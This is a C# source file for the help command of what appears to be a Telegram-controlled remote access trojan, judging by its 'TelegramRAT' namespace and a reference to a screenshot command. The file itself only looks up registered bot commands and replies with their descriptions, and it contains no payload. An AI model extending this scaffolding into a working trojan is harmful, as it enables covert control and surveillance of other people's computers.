using Telegram.Bot;
using System.Text;
using Telegram.Bot.Types.Enums;

namespace TelegramRAT.Commands.Core;

public class HelpCommand(ITelegramBotClient botClient, IEnumerable<IBotCommand> commands) : AbstractBotCommand
{
    public override string Command => "help";
    public override string Description => "Show description of other commands.";
    public override string Example => "/help screenshot";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        if (!model.Args.Any())
        {
            var helpText = "Use this command to retrieve description of other commands, like this: /help screenshot\nTo get list of all commands - type /commands";
            await botClient.SendMessage(
                model.Message.Chat.Id,
                helpText,
                replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
            );
            return;
        }

        var command = commands.FirstOrDefault(c => c.Command.Equals(model.Args[0], StringComparison.OrdinalIgnoreCase) ||
                                                  (c.Aliases?.Contains(model.Args[0], StringComparer.OrdinalIgnoreCase) == true));

        if (command == null)
        {
            await botClient.SendMessage(
                model.Message.Chat.Id,
                "This command doesn't exist! To get list of all commands - type /commands",
                replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
            );
            return;
        }

        var description = new StringBuilder($"<b>/{command.Command.ToUpper()}</b>\n");
        if (command.Aliases?.Any() == true)
            description.AppendLine($"Aliases: {string.Join(", ", command.Aliases)}\n");
        description.AppendLine($"{command.Description ?? "<i>No description provided</i>"}");
        if (!string.IsNullOrEmpty(command.Example))
            description.AppendLine($"Example: {command.Example}");

        await botClient.SendMessage(
            model.Message.Chat.Id,
            description.ToString(),
            ParseMode.Html,
            replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
        );
    }
}
